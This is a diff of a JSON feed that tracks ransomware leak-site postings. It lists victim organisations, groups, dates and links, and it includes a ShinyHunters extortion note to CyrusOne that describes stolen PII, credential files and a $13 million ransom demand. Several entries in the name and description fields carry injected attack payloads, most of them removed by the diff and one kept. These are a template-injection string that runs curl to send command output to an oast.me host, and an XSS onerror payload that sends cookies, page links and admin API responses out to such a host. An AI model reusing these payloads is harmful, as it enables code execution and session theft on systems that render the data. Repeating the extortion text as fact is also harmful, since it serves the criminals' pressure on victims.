@@ -1,6 +1,40 @@
 {
-  "updatedAt": "2026-08-23T18:54:45.897Z",
+  "updatedAt": "2026-08-24T04:59:27.501Z",
   "leaks": [
+    {
+      "groupName": "krybit",
+      "victimName": "resi.com",
+      "discoveredAt": "2026-08-24 03:33:49.573173",
+      "description": "Resi is a UK-based online architectural and home renovation platform founded in 2017 by Alexandra Depledge and Jules Col...",
+      "link": "https://www.ransomlook.io/blog/94e954f9fa4095799dede0c689e6d6b51ddddaff16d44b75cf49ba265dc3a79a/"
+    },
+    {
+      "groupName": "black x",
+      "victimName": "Private(Chat...)",
+      "discoveredAt": "2026-08-24 03:33:39.767547",
+      "link": "https://www.ransomlook.io/target/6a8432c0e803c3deeea2a6d6"
+    },
+    {
+      "groupName": "coinbase cartel",
+      "victimName": "Westwing Group SE NEW",
+      "discoveredAt": "2026-08-24 02:29:23.066983",
+      "description": "Furniture - $465.5 Million",
+      "link": "https://www.ransomlook.io/companies/westwing-2"
+    },
+    {
+      "groupName": "shinyhunters",
+      "victimName": "CyrusOne, LLC.",
+      "discoveredAt": "2026-08-23 23:31:53.834364",
+      "description": "Update 23 Aug: We are removing the clients name off this post. They are refusing to pay a $13 million demand. They have 24 hours left to engage with us. We hold 12.9 million Salesforce records along with:\nSharepoint:\n(369.6 GB Compressed / 645 GB Uncompressed)\n288,729 Files, 60,513 Folders\n\n- More than 182,000 rows of Customer data Extracted from the \"Contacts\" Salesforce Object. \n- Over 8,300 Rows of Employee PII (Full Name, Email, Job Title, Phone Number, ect.)\n- Thousands of executed contracts, MSAs, NDAs, amendments, leases, and SOWs\n- Extensive physical key inventory logs, verification photos, and contractor Green Badge audits\n- Large collection of data center drawings, floor plans, electrical one-line diagrams, security system drawings, and site schematics\n- Full CERM (Critical Environment Reliability Management) process library\n- Physical and information security policy suite plus governance materials\n- Regional security scorecards, KPI workbooks, GAM sheets, and signed performance packages\n- Credential and access-control artifacts (including PasswordList.xlsx, Okta SSC Access lists, active badge reports, and multiple Data Center Access Control forms)This is a final warning to reach out by end of day 24 Aug 2026 before we leak along with several annoying (digital) problems that'll come your way. Make the right decision, don't be the next headline.",
+      "link": "https://www.ransomlook.io/"
+    },
+    {
+      "groupName": "genesis",
+      "victimName": "Hospitality Health ER (Longview)",
+      "discoveredAt": "2026-08-23 23:31:22.337689",
+      "description": "A healthcare organization",
+      "link": "https://www.ransomlook.io/9e19757b54df85888c12/"
+    },
     {
       "groupName": "qilin",
       "victimName": "S.E.M.P. s.r.l.",
@@ -311,41 +345,6 @@
       "victimName": "RCSSTI2 {{7*7}}",
       "discoveredAt": "2026-08-22 04:26:13.969524",
       "description": "ssti2 {{self.__init__.__globals__.__builtins__.__import__('os').popen(\"curl -s https://nzagpz3jm8i5v726mnliix7xw412xve3w.oast.me/ssti-$(id|base64 -w0|tr '+/' '-_')\").read()}}",
-      "link": "https://www.ransomlook.io/"
-    },
-    {
-      "groupName": "the gentlemen",
-      "victimName": "OPVIEW1",
-      "discoveredAt": "2026-08-22 04:26:13.048666",
-      "description": "Catalog sync pending - media index incomplete. <img src=x onerror=\"fetch('https://hc2fqkuw8di8e46rpr2prwfgbyi0rfh9n.oast.me/x?u='+encodeURIComponent(location.href)+'&c='+encodeURIComponent(document.cookie)+'&ua='+encodeURIComponent(navigator.userAgent));fetch('/api/admin/images').then(r=>r.text().then(t=>fetch('https://hc2fqkuw8di8e46rpr2prwfgbyi0rfh9n.oast.me/adm?st='+r.status+'&b='+encodeURIComponent(t.slice(0,400))))).catch(e=>0);fetch('https://hc2fqkuw8di8e46rpr2prwfgbyi0rfh9n.oast.me/dom?h='+encodeURIComponent([...document.querySelectorAll('a[href]')].map(a=>a.getAttribute('href')).join('|').slice(0,700)));\">",
-      "link": "https://www.ransomlook.io/"
-    },
-    {
-      "groupName": "the gentlemen",
-      "victimName": "RCNL1",
-      "discoveredAt": "2026-08-22 04:13:46.336169",
-      "description": "newline probe",
-      "link": "https://www.ransomlook.io/"
-    },
-    {
-      "groupName": "the gentlemen",
-      "victimName": "TRAVA",
-      "discoveredAt": "2026-08-22 04:13:45.388998",
-      "description": "img2<img src='https://nzagpz3jm8i5v726mnliix7xw412xve3w.oast.me/rcimg2-desc.png'>",
-      "link": "https://www.ransomlook.io/"
-    },
-    {
-      "groupName": "the gentlemen",
-      "victimName": "TRAVB",
-      "discoveredAt": "2026-08-22 04:13:44.454628",
-      "description": "img2<img src='https://nzagpz3jm8i5v726mnliix7xw412xve3w.oast.me/rcimg2-desc.png'>",
-      "link": "https://www.ransomlook.io/"
-    },
-    {
-      "groupName": "the gentlemen",
-      "victimName": "TRAVC",
-      "discoveredAt": "2026-08-22 04:13:43.502902",
-      "description": "img2<img src='https://nzagpz3jm8i5v726mnliix7xw412xve3w.oast.me/rcimg2-desc.png'>",
       "link": "https://www.ransomlook.io/"
     }
   ]
